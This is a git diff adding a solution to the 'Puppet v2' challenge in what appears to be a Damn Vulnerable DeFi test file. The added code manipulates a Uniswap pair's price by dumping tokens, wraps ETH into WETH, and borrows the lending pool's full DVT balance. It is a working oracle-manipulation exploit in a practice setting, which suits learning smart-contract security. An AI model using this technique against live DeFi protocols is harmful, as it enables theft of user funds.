@@ -82,6 +82,58 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Aim: Drain all DVT tokens from lending pool
+        // Strategy: Should be the same with Puppet v1 -> make _getOracleQuote() as minimum as possible (ideally close to zero)
+        // Method: drain eth from pair, make 'function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut)' return smaller reserve amount
+
+        const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20 minutes from the curr
+
+        // approve attacker tokens on uniswap exchange
+        await this.token.connect(attacker).approve(
+            this.uniswapRouter.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+
+        // sell tokens to get wETH
+        const depRequiredBefore = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log("Before swap deposit required: " + ethers.utils.formatEther(depRequiredBefore))
+
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            1,
+            [this.token.address, this.weth.address],
+            attacker.address,
+            deadline,
+        )
+
+        const depRequiredAfter = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log("After swap deposit required: " + ethers.utils.formatEther(depRequiredAfter))   // 29.49649483319732198 wETH is required. We don't have it, yet :)
+
+        // Attacker has no DVT left, but it still has ETH :)
+        // We'll get remaining wETH required from converting ETH to wETH
+        const attackerEthBalance = await ethers.provider.getBalance(attacker.address)
+        console.log('ETH balance: ' , ethers.utils.formatEther(attackerEthBalance))
+
+        const attackerWETHBalance = await this.weth.balanceOf(attacker.address)
+        console.log('wETH balance before swapping ETH to wETH: ', ethers.utils.formatEther(attackerWETHBalance))
+
+        await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther('19.8')})
+
+        const attackerWETHBalanceAfter = await this.weth.balanceOf(attacker.address)
+        console.log('wETH balance after swapping ETH to wETH: ', ethers.utils.formatEther(attackerWETHBalanceAfter))
+
+        // approve wETH
+        await this.weth.connect(attacker).approve(
+            this.lendingPool.address,
+            attackerWETHBalanceAfter
+        );
+
+        // hack
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
+        // console.log(await this.token.balanceOf(this.lendingPool.address))
+        // console.log(ethers.utils.formatEther(await this.token.balanceOf(attacker.address)))
     });
 
     after(async function () {
